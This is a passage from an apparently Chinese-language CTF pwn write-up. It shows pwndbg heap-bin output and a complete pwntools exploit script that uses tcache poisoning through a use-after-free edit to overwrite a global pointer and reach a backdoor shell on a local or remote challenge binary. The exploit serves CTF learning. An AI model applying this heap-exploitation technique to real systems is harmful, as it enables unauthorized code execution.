0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x21c8650 —▸ 0x4040a8 ◂— 0xffffffff00000000
```

调用calloc后：

```c
pwndbg> bins
tcachebins
0x80 [  7]: 0x4040b8 (completed) —▸ 0x21c84e0 —▸ 0x21c8460 —▸ 0x21c83e0 —▸ 0x21c8360 —▸ 0x21c82e0 —▸ 0x21c8260 ◂— 0x0
pwndbg> telescope 0x4040b8+8
00:0000│   0x4040c0 (ptr) —▸ 0x21c8010 ◂— 0x7000000000000
01:0008│   0x4040c8 ◂— 0x0
```

成功把`tcache`写入`ptr`，这也是为什么后门函数在一开始会有个诡异的`calloc`，顺带一提的是`calloc`不会使用`tcache`里的堆块

exp：

```python
from pwn import *

context.arch = 'amd64'

def cmd(c):
	p.recvuntil("your choice?")
	p.sendline(str(c))
	
def add(idx):
	cmd(1)
	p.recvuntil("idx?")
	p.sendline(str(idx))
def dele(idx):
	cmd(3)
	p.recvuntil("idx?")
	p.sendline(str(idx))
def edit(idx,content):
	cmd(2)
	p.recvuntil("idx?")
	p.send(str(idx).ljust(0xf,"\x00"))
	p.send(content)
	
def main(host,port=4205):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		gdb.attach(p,"b *0x000000000401343")
		# gdb.attach(p)
	for i in range(9):
		add(i)
	for i in range(9):
		dele(i)
	edit(8,p64(0x0000000004040C0-0x18))
	add(1)
	cmd(6)
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./re-alloc",checksec=False)
	main(args['REMOTE'])
```

